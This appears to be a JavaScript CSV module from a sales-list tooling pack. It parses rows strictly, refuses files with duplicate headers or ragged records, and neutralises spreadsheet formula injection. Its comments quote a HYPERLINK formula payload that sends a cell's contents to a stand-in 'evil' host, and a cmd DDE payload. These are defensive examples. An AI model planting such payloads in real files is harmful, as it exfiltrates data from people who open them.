// _lib/csv.mjs — one CSV implementation, shared.
//
// There were two readings of "a CSV row" in the pack and they disagreed. The writer
// (suppression.writeOutputList) quotes any value containing a newline, and the reader
// (enrich.parseCsv) accepts those. But `/comply erase` split the file on newlines and
// deleted physical LINES, so a record spanning two lines lost the line carrying the
// email and kept the name, phone and company — leaving an unterminated quote that
// corrupted everything after it, while the erase report claimed success.
//
// A deletion request is the wrong place to have two opinions about what a row is.

/**
 * A file we refuse to read as records. Law 5 shape, same as
 * `_lib/suppression.mjs`'s SuppressionUnavailableError: `verdict: 'STOP'`, and a
 * message that names the record so the operator can go and look at it.
 *
 * It is defined here rather than imported because suppression.mjs imports THIS
 * module (for escapeField); importing back would be a cycle.
 */
export class CsvStructureError extends Error {
  constructor (msg, { path = null, record = null } = {}) {
    super(msg);
    this.name = 'CsvStructureError';
    this.path = path;
    this.record = record;
    this.verdict = 'STOP';
  }
}

/**
 * RFC4180-ish: quoted fields, embedded commas and newlines, doubled quotes, CRLF.
 *
 * Every unquoted line ending terminates a record: LF, CRLF, and a lone CR. The lone
 * CR used to be DISCARDED, which was the same class of bug as the two escapers
 * disagreeing (see the note in suppression.mjs): the WRITER quotes a CR precisely
 * because Excel and most CRM importers treat it as a row break, and the reader then
 * ate it. The consequences were not cosmetic:
 *
 *   - A CR-delimited export (legacy Mac, older Excel-for-Mac, some CRM exports) is
 *     one physical line, so `parseCsv` returned ZERO records for a 5,000-row list.
 *   - A single CR inside an otherwise LF-delimited file GLUED two records together:
 *     `Ada,ok@x.com\rnope@acme.com,Bob` read as the one value `ok@x.comnope@acme.com`.
 *     That is a fail-OPEN in suppression — the glued string equals no store entry, so
 *     the suppressed address rode into the output list — and it dropped Bob entirely.
 *
 * CRLF is ONE terminator, not two, so it emits no blank record between the halves.
 * A CR *inside quotes* is data and is preserved: RFC 4180 allows it and `escapeField`
 * deliberately quotes it.
 */
export function parseRows (text) {
  const rows = [];
  let row = [], field = '', inQuotes = false, sawAny = false;
  for (let i = 0; i < text.length; i += 1) {
    const c = text[i];
    if (inQuotes) {
      if (c === '"') {
        if (text[i + 1] === '"') { field += '"'; i += 1; } else inQuotes = false;
      } else field += c;
      sawAny = true;
      continue;
    }
    if (c === '"') { inQuotes = true; sawAny = true; continue; }
    if (c === ',') { row.push(field); field = ''; sawAny = true; continue; }
    if (c === '\r' || c === '\n') {
      if (c === '\r' && text[i + 1] === '\n') i += 1;   // CRLF is one terminator
      row.push(field); rows.push(row); row = []; field = ''; sawAny = false;
      continue;
    }
    field += c;
    sawAny = true;
  }
  if (sawAny || field !== '' || row.length) { row.push(field); rows.push(row); }
  return rows;
}

/** First header name that appears twice, or null. Compared after trimming. */
function firstDuplicateHeader (header) {
  const seen = new Set();
  for (const h of header) {
    if (seen.has(h)) return h;
    seen.add(h);
  }
  return null;
}

/**
 * Header row + objects. **Refuses** a file whose shape would cost it data.
 *
 * Two silent-loss cases used to pass through as ordinary rows:
 *
 *   - A DUPLICATE header (`Email,Email`). `Object.fromEntries` keeps the last
 *     occurrence, so the first column was destroyed before any caller saw it. A
 *     suppressed address in the dropped column could never be matched.
 *   - A RAGGED record (header `a,b`, record `1,2,3`). The extra cell was dropped;
 *     a short record silently filled with ''. Either way the record no longer means
 *     what the file says, and a shifted email column is a fail-open.
 *
 * Both now throw CsvStructureError (verdict STOP), because this is the reader that
 * feeds `filterOutputList` — via `enrich.readInputRows` and via every skill that
 * loads `gtm/lists/*.csv` — and Law 5 says the enforcement point fails closed. The
 * refusal lives in `parseCsv` rather than in a separate strict variant for exactly
 * that reason: a variant would have to be adopted caller by caller, and the callers
 * that forgot would be the ones holding the fail-open.
 *
 * `parseRows` stays tolerant on purpose. It returns raw cells with no header
 * semantics, and it is what `/comply erase` uses: a deletion request must be able to
 * read a malformed file in order to delete from it. Refusing there would leave PII
 * in place.
 *
 * A wholly-blank record is skipped, not refused — that is a blank line or a trailing
 * newline, not raggedness.
 */
export function parseCsv (text, { path = null } = {}) {
  const rows = parseRows(text);
  if (!rows.length) return [];
  const header = rows[0].map(h => h.trim());
  const dup = firstDuplicateHeader(header);
  if (dup !== null) {
    throw new CsvStructureError(
      `CSV${path ? ` at ${path}` : ''} has a duplicate header column "${dup}" — STOP. `
      + 'Reading it as records would keep only the last column of that name and silently '
      + 'destroy the others. Rename the columns and re-run.',
      { path, record: 1 },
    );
  }
  const out = [];
  for (let i = 1; i < rows.length; i += 1) {
    const r = rows[i];
    if (!r.some(v => String(v).trim() !== '')) continue;   // blank line
    if (r.length !== header.length) {
      throw new CsvStructureError(
        `CSV${path ? ` at ${path}` : ''} record ${i + 1} has ${r.length} field(s) but the header `
        + `has ${header.length} — STOP. A ragged record means the columns no longer line up, `
        + 'so values would be read under the wrong names or dropped.',
        { path, record: i + 1 },
      );
    }
    out.push(Object.fromEntries(header.map((h, j) => [h, r[j].trim()])));
  }
  return out;
}

// --- spreadsheet formula injection ----------------------------------------
//
// The pack's whole point is that a human opens gtm/lists/*.csv in Excel, Sheets,
// HubSpot or Salesforce. Those readers evaluate a cell that starts with =, +, -, @,
// TAB or CR as a FORMULA, not as text — so a value the pack merely copied out of an
// API response becomes code the moment the file is opened. An attacker who sets their
// own LinkedIn company name to
//   =HYPERLINK("http://evil/"&A1,"x")
// gets it enriched into the rep's list and exfiltrates the adjacent cell (a
// colleague's work email) on open. No LLM cooperation and no operator mistake
// required. Quoting does not help: quoting is CSV syntax, and the reader evaluates
// the field AFTER unquoting it.
//
// The fix is the standard one — prefix a leading apostrophe, which every spreadsheet
// reads as "the rest of this cell is text".
const FORMULA_LEAD = /^[=+\-@\t\r]/;

// Idempotence. `/comply erase` reads a list with parseRows and rewrites it with
// stringifyRows, and enrich re-reads its own output. parseRows returns the neutralised
// value WITH its apostrophe, so a naive re-prefix would accumulate one more marker on
// every read-modify-write cycle. A value already carrying the marker is already safe.
// Cost: a genuine value of  '=x  is left alone rather than doubled, so a spreadsheet
// shows it as  =x . A display-fidelity loss on a vanishingly rare input, traded for a
// file that cannot grow quotes.
const ALREADY_NEUTRALISED = /^'[=+\-@\t\r]/;

// A negative number must stay a number. `-42`, `-3.14`, `-1.2e-3` are inert in every
// spreadsheet — a bare numeric literal carries no cell reference, no function call and
// no DDE payload — but `'-42` imports as TEXT and silently breaks every downstream SUM,
// sort and CRM number field. So a fully-numeric literal is exempt. The exemption is
// deliberately narrow: it must match the WHOLE string, so `-1+A1`, `-2+cmd|'/c calc'!A`
// and `-1-HYPERLINK(...)` are all still neutralised. `+42` gets the same exemption for
// the same reason (a spreadsheet evaluates it to the constant 42).
const PLAIN_NUMBER = /^[+-](?:\d+(?:\.\d+)?|\.\d+)(?:[eE][+-]?\d+)?$/;

/** Make a value inert in a spreadsheet reader. Idempotent. */
export function neutraliseFormula (str) {
  if (!FORMULA_LEAD.test(str)) return str;
  if (ALREADY_NEUTRALISED.test(str) || PLAIN_NUMBER.test(str)) return str;
  return `'${str}`;
}

export function escapeField (v) {
  const str = neutraliseFormula(v === null || v === undefined ? '' : String(v));
  return /[",\n\r]/.test(str) ? `"${str.replace(/"/g, '""')}"` : str;
}

/** Re-emit rows of raw cells. Used by erase, which rewrites records, not lines. */
export function stringifyRows (rows, eol = '\n') {
  return rows.map(r => r.map(escapeField).join(',')).join(eol) + eol;
}
